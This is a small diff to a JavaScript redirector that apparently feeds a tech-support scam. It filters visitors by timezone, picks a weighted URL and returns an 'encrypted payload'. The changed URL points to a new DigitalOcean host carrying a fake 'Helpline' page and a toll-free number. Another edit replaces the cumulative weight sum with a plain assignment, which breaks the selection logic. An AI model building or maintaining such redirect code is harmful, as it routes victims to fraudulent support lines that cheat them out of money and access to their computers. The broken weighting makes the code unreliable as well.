@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://squid-app-dnkkv.ondigitalocean.app/Wininofcodexx39Helpline/?bcda=1800-320-629", weight: 1.0 } 
+    { url: "https://clownfish-app-ybykv.ondigitalocean.app/Wininofcodexx39Helpline/index.html?Anph=1800-320-629", weight: 1.0 } 
 
 ];
 
@@ -61,7 +61,7 @@ function getFastResponse() {
     let cumulativeWeight = 0;
 
     for (const item of PRECOMPUTED_RESPONSES) {
-        cumulativeWeight += item.weight;
+        cumulativeWeight = item.weight;
         if (rand <= cumulativeWeight) {
             return item.encryptedPayload;
         }
